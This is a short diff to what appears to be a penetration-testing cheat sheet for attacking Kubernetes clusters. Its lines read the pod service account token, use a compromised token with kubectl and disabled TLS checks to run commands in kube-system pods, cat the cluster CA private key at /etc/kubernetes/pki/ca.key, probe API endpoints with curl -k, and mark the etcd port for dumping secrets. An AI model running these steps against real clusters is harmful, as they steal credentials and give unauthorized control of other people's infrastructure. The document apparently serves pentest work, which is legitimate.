@@ -45,7 +45,7 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
    - (from inside a nodeJS pod, we query the nodeJS server)
 - cat /var/run/secrets/kubernetes.io/serviceaccount/token
    - (view service account token!)
-- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system exec <POD> -- get pods
+- kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system exec <POD> -- ls
    - RCE with compromised SA token
   
 ------------------------------------------------------------------------------------------------------------------------------------
@@ -61,7 +61,9 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
          - exec <POD> -- ls
          - exec <POD> -- cat /etc/kubernetes/pki/ca.key 
          - try --namespace=kube-system
-      - curl -k https://[IP]:[PORT]/version
+      - curl -k https://[IP]:[PORT]
+         - try /version
+         - try /endpoints
       
 2379 - etcd client
       - DUMP SECRETS
